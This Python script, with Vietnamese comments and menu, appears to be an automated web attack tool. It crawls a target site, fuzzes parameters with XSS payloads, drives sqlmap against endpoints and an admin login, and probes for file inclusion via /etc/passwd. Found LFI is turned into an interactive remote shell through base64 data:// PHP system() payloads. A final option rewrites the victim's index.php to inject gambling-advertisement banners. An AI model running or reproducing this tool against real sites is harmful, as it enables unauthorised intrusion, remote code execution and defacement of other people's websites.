import subprocess
from colorama import Fore, Style
import os
import requests
from colorama import Fore, Style
import argparse
import urllib.parse
import time
import base64
import re
endpoints= []
vulns = set()

def execute_command(command):

    exit_code = os.system(command)

    if exit_code == 0:
        print(Fore.GREEN + f"Đã chạy xong : {command}" + Style.RESET_ALL)
    else:
        print("Có lỗi xảy ra với mã thoát:", exit_code)
    # Chạy lệnh
    

def find_xss(url):

    payload_xss_try =["<script>alert(1)</script>","<img src=1 onerror=alert(1)>"]
    payload = """abcxyz><"'"""
    generate_payload_test_xss(url)
    print("Đang tìm lỗ hổng XSS...")
    
    i= 0
    
    for endpoint in endpoints:
        check = False
        check_vuln = False
        # Gửi yêu cầu HTTP
        i = i +1
        url = f"{i} - URL : {endpoint}"
        try:
            start = time.time()
            response = requests.get(f"{endpoint}")
            
            end = time.time()
            total = end - start
            if total >= 10 :
                print("Quá giờ")
                pass
            print(Fore.YELLOW + url + Style.RESET_ALL)
            print("\n")
            # Kiểm tra xem phản hồi có chứa chuỗi "abcxyz" hay không
            if payload in response.text:

                # Lọc và in ra các dòng có chứa "abcxyz", highlight bằng màu xanh
                for line in response.text.splitlines():
                    if payload in line:
                        check = True
                        highlighted_line = line.replace(f"{payload}", Fore.GREEN + f"{payload}" + Style.RESET_ALL)
                        print(highlighted_line)  # In dòng với từ được highlight
                        print("\n")

                if check == True:
                    for xss in payload_xss_try:

                        parsed_url = urllib.parse.urlparse(endpoint)
                        # print(parsed_url , "\n")
                        query_params = urllib.parse.parse_qs(parsed_url.query)

                        # Thay thế giá trị của các tham số
                        for param in query_params:
                            query_params[param] = xss

                        # # Xây dựng lại
                        
                        new_query = urllib.parse.urlencode(query_params)
                        endpoint = parsed_url._replace(query=new_query).geturl()
                        
                        print( Fore.YELLOW + f"Try payload {xss}" + Style.RESET_ALL )
                        # print("ENDPOINT NEW :",endpoint)
                        response = requests.get(f"{endpoint}")

                        if xss in response.text:

                    # Lọc và in ra các dòng có chứa "abcxyz", highlight bằng màu xanh
                            for line in response.text.splitlines():
                                if xss in line:
                                    check_vuln = True
                                    highlighted_line = line.replace(f"{xss}", Fore.GREEN + f"{xss}" + Style.RESET_ALL)
                                    print(highlighted_line)  # In dòng với từ được highlight
                                    print("\n")
                    
                    if check_vuln == True :
                        vulns.add(endpoint + "      -->     XSS")

        except Exception:
            print(Exception)
            pass
    print("Kiểm tra hoàn tất.")
    # Xuất ra tất cả các lỗi xss tìm được
    print("-------------- Các lỗ hỏng XSS ------------")
    for vuln in vulns :
        print(Fore.RED + f"{vuln}\n" + Style.RESET_ALL)

    print("-----------------------------------------------------")

def find_sqli(url):

    generate_payload_test_SQL_injection(url)
    print("Đang tìm lỗ hổng SQL injection...")
    
    i= 0
    check_sql = False
    for endpoint in endpoints:
        check_sql = False
        # Gửi yêu cầu HTTP
        i = i +1
        url_ = f"{i} - URL : {endpoint}"
        try:
            start = time.time()
            response = requests.get(f"{endpoint}")
            
            end = time.time()
            total = end - start
            if total >= 10 :
                print("Quá giờ")
                pass
            print(Fore.YELLOW + url_ + Style.RESET_ALL)
            print("\n")
            # Kiểm tra xem phản hồi có chứa chuỗi "abcxyz" hay không
            if response.status_code >= 500 or "You have an error in your SQL syntax" in response.text:
                    parsed_url = urllib.parse.urlparse(endpoint)
                    query_params = urllib.parse.parse_qs(parsed_url.query)
                
                    # Thay thế giá trị của các tham số
                    for param in query_params:
                            query_params[param] = 1

                        # # Xây dựng lại
                    new_query = urllib.parse.urlencode(query_params, doseq=True)
                    endpoint = parsed_url._replace(query=new_query).geturl()
                    print(Fore.YELLOW + f"Đang sử dụng : sqlmap -u {str(endpoint)} --batch --dbs -t 10  --ignore-redirects --random-agent" + Style.RESET_ALL)
                    command = f"sqlmap -u {endpoint} --batch -t 10 --ignore-redirects --random-agent --dbs"
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                   
                    content_sql =""
                    # Đọc và in ra output và lỗi từ sqlmap
                    for line in process.stdout:
                        content_sql = content_sql + line.decode()+"\n"
                        if "[INFO] fetching database names" in line.decode():
                            check_sql = True
                            vulns.add(endpoint + "      -->     SQL injection")
                    
                    if check_sql == True:
                         print(content_sql)

        except Exception as e:
            print(e)
    
    url_login_admin = url +"/admin/login_controller.php"
    print(Fore.YELLOW + f"""Đang sử dụng : sqlmap -u {url_login_admin} --method POST --data "username=test&password=test" --batch --dbs -t 10  --ignore-redirects --random-agent""" + Style.RESET_ALL)
    command = f"""sqlmap -u {url_login_admin} --method POST --data "username=test&password=test" --batch --dbs -t 10 --ignore-redirects --random-agent"""
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                  
    content_sql =""
                   
    for line in process.stdout:
        content_sql = content_sql + line.decode()+"\n"
        if "[INFO] fetching database names" in line.decode():
            check_sql = True               
            vulns.add(url_login_admin + "      -->     SQL injection With Method POST")
    
    if check_sql == True:
                         print(content_sql)




    print("Kiểm tra hoàn tất.")
    # Xuất ra tất cả các lỗi xss tìm được
    print("-------------- Các lỗ hỏng SQL injection ------------")
    for vuln in vulns :
         print(Fore.RED + f"{vuln}\n" + Style.RESET_ALL)

    print("-----------------------------------------------------")

def find_file_inclusion(url):
    generate_payload_test_File_inclusion(url)
        
    check = False
    endpoint_LFI = []
    i= 0
    for endpoint in endpoints:
        
        # Gửi yêu cầu HTTP
        i = i +1
        url = f"{i} - URL : {endpoint}"
        try:
            start = time.time()
            response = requests.get(f"{endpoint}")
            
            end = time.time()
            total = end - start
            if total >= 10 :
                print("Quá giờ")
                pass
            print(Fore.YELLOW + url + Style.RESET_ALL)
            print("\n")
            # Kiểm tra xem phản hồi có chứa chuỗi "abcxyz" hay không
            if "root:x:0" in response.text or "[extensions]" in response.text:
                print(Fore.RED + f"{endpoint}     -->   File inclusion \n" + Style.RESET_ALL)
                endpoint_LFI.append(endpoint)
                check = True

        except Exception as e:
            print(e)
        
       
    print("Kiểm tra hoàn tất.")

    if check == True:
                host = get_host(url)
                with open(f"RCE-via-LFI-{host}.txt","a+") as file2:
                     file2.write(endpoint_LFI[0])
                parsed_url = urllib.parse.urlparse(endpoint_LFI[0])
                query_params = urllib.parse.parse_qs(parsed_url.query)
                shell =""
                while ("exit" not in shell) :
                    shell = str(input("$")).strip()
                    php_code = f"""<?php echo "||" ;system("{shell}"); echo "||" ?>"""
                    # Thay thế giá trị của các tham số
                    encoded_data = base64.b64encode(php_code.encode('utf-8'))
                    payload = "data://text/plain;base64,"+  encoded_data.decode("utf-8")

                    for param in query_params:
                        query_params[param] = (payload)
                        new_query = urllib.parse.urlencode(query_params, doseq=True)
                        new_url = parsed_url._replace(query=new_query).geturl()
                        # print(new_query)

                    
                    response = requests.get(new_url)
                    # print(response.text)
                    pattern = re.compile( r"\|\|(.*?)\|\|",re.DOTALL)

                    match = re.search(pattern,response.text)

                    if match:
                        extracted_data = match.group().replace("||","")  # Lấy phần chuỗi giữa hai dấu ||
                        print( extracted_data)
                    else:
                        print("No match found")
   
# Chèn quảng cáo vào trang chủ index.php
def inject_ads(url):
    print("Đang chèn quảng cáo qua lỗ hổng RCE...")

    php_code ="""<?php
    $file_path = 'index.php';

    $content = file_get_contents($file_path);

    $new_content = str_replace('<body>', '<body> <div id="chilladv" class="container"> <div id="headerpcads"><div class="hidemobile"><center><a target="_blank" rel="nofollow" href="https://tinyurl.com/dabet-phimmoichill-topbanner"><img class=" ls-is-cached lazyloaded" src="https://phimmoichilltv.net/newchill/vn88_pc.gif" height="60px" width="50%" alt=""></a><a target="_blank" rel="nofollow" href="https://6686vn.biz/dl30"><img class=" ls-is-cached lazyloaded" src="https://phimmoichilltv.net/newchill/66_pc.gif" height="60px" width="50%" alt=""></a><br><a target="_blank" rel="nofollow" href="https://tinyurl.com/phimmoichill-vn88"><img class=" ls-is-cached lazyloaded" src="https://phimmoichilltv.net/newchill/vn88_pc.gif" height="60px" width="728px" alt=""></a></center></div></div> <div id="headermbads"><div class="hidedesktop"><center><a target="_blank" rel="nofollow" href="https://tinyurl.com/dabet-phimmoichill-topbanner"><img class=" ls-is-cached lazyloaded" src="https://phimmoichilltv.net/newchill/da_mb.gif" height="40px" width="320px" alt=""></a><br><a target="_blank" rel="nofollow" href="https://6686vn.biz/dl30"><img class=" ls-is-cached lazyloaded" src="https://phimmoichilltv.net/newchill/66_mb.gif" height="40px" width="320px" alt=""></a><br><a target="_blank" rel="nofollow" href="https://tinyurl.com/phimmoichill-vn88"><img class=" ls-is-cached lazyloaded" src="https://phimmoichilltv.net/newchill/vn88_mb.gif" height="40px" width="320px" alt=""></a></center></div> </div> </div>', $content);

    file_put_contents($file_path, $new_content);
    echo 'Success!';
    ?>
    """

    host =get_host(url)
    try:
        with open(f"RCE-via-LFI-{host}.txt","r") as file2:
                endpoint = file2.read()
    except Exception:
        print("Chưa Tìm thấy RCE từ trang web này qua LFI")
        return ""
    
    parsed_url = urllib.parse.urlparse(endpoint.strip())
    query_params = urllib.parse.parse_qs(parsed_url.query)
    encoded_data = base64.b64encode(php_code.encode('utf-8'))
    payload = "data://text/plain;base64,"+  encoded_data.decode("utf-8")

    for param in query_params:
        query_params[param] = (payload)
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        new_url = parsed_url._replace(query=new_query).geturl()

    response = requests.get(new_url)
    if "Success!" in response.text:
        print("Tệp index.php đã được thay đổi thành công!")
    else:
        print("Tệp index.php thay đổi không thành công!!!")


#Tạo payload để tìm SQL injection
def generate_payload_test_File_inclusion(url_web):

    payload_file_inclusion = ["../../../../etc/passwd","/etc/passwd","C:/Windows/win.ini"]

    host = get_host(url_web)
    try:
        with open(f'katana-{host}.txt', 'r') as file:
            urls = file.readlines()
    except Exception:
         print("Hãy RECON trước khi khai thác !")
    
        # Xử lý từng URL
    for url in urls:
            url = url.strip()  # Loại bỏ khoảng trắng và ký tự xuống dòng
            parsed_url = urllib.parse.urlparse(url)
            # print(parsed_url , "\n")
            query_params = urllib.parse.parse_qs(parsed_url.query)

            # Thay thế giá trị của các tham số
           

            for param in query_params:
                for payload in payload_file_inclusion:
                    query_params[param] = (payload)
                    new_query = urllib.parse.urlencode(query_params, doseq=True)

                    new_url = parsed_url._replace(query=new_query).geturl()
                    if new_url.startswith("http://") or new_url.startswith("https://"):
                        endpoints.append(new_url)



def recon_web(url):
    

        host = get_host(url)
        commands = [ f"dirsearch -u {url} -i 200 -o dirsearch-{host}.txt " , f"katana -u {url} -o katana-{host}.txt"]

        print(Fore.GREEN + f"------------- Đang Recon -----------" + Style.RESET_ALL)
        for command in commands: 
            execute_command(command)


def get_host(url):
     return url.split("://")[1].split("/")[0]

def generate_payload_test_xss(url_web):


    host = get_host(url_web)
    try:
        with open(f'katana-{host}.txt', 'r') as file:
            urls = file.readlines()
    except Exception:
         print("Hãy RECON trước khi khai thác !")
    
   
    payload = """abcxyz><"'"""
        # Xử lý từng URL
    for url in urls:
            url = url.strip()  # Loại bỏ khoảng trắng và ký tự xuống dòng
            parsed_url = urllib.parse.urlparse(url)
            # print(parsed_url , "\n")
            query_params = urllib.parse.parse_qs(parsed_url.query)

            # Thay thế giá trị của các tham số
            for param in query_params:
                query_params[param] = (payload)

            # # Xây dựng lại
            
            new_query = urllib.parse.urlencode(query_params, doseq=True)

            new_url = parsed_url._replace(query=new_query).geturl()
            if new_url.startswith("http://") or new_url.startswith("https://"):
                endpoints.append(new_url)
            # # # In ra URL đã thay đổi
            # print(new_url)

#Tạo payload để tìm SQL injection
def generate_payload_test_SQL_injection(url_web):


    host = get_host(url_web)
    try:
        with open(f'katana-{host}.txt', 'r') as file:
            urls = file.readlines()
    except Exception:
         print("Hãy RECON trước khi khai thác !")
    

    payload = """abcxyz><"'"""
        # Xử lý từng URL
    for url in urls:
            url = url.strip()  # Loại bỏ khoảng trắng và ký tự xuống dòng
            parsed_url = urllib.parse.urlparse(url)
            # print(parsed_url , "\n")
            query_params = urllib.parse.parse_qs(parsed_url.query)

            # Thay thế giá trị của các tham số
           

            for param in query_params:
                if "page" == param:
                     continue
                query_params[param] = (payload)

            # # Xây dựng lại
            
            new_query = urllib.parse.urlencode(query_params, doseq=True)

            new_url = parsed_url._replace(query=new_query).geturl()
            if new_url.startswith("http://") or new_url.startswith("https://"):
                endpoints.append(new_url)
            # # # In ra URL đã thay đổi
            # print(new_url)




def lua_chon_chuc_nang(url):
  
    print(Fore.RED +"""                      _____ 
     /\              / ____|
    /  \     _ __   | |     
   / /\ \   | '_ \  | |     
  / ____ \  | | | | | |____ 
 /_/    \_\ |_| |_|  \_____|
          
          """ + Style.RESET_ALL)



    print("Chọn một trong các lựa chọn sau:")
    print("1/ Recon web")
    print("2/ Tìm lỗ hổng XSS")
    print("3/ Tìm SQLi")
    print("4/ Tìm File Inclusion")
    print("5/ Chèn quảng cáo (nếu có RCE)")

    try:
        choice = int(input("\nNhập vào lựa chọn: "))

        # Match-case (Python 3.10+)
        if  choice == 1 :        
                recon_web(url)
        elif choice == 2:
                find_xss(url)
        elif choice == 3:
                find_sqli(url)
        elif choice == 4:
                find_file_inclusion(url)
        elif choice == 5:
                inject_ads(url)
        else:
                print("Lựa chọn không hợp lệ. Vui lòng nhập số từ 1 đến 5.")
    except ValueError:
        print("Lỗi: Bạn phải nhập một số.")

if __name__ == "__main__":
    url  = input("\nNhập URL (http:// | https:// ): ").strip()
    # url ="http://172.24.224.1/VulnerableWebsite-master"

    if url == "" or (not url.startswith("http://") and not url.startswith("https://")):
        print("Hãy nhập URL để RECON and ATTACK !")
    
    else :
        lua_chon_chuc_nang(url)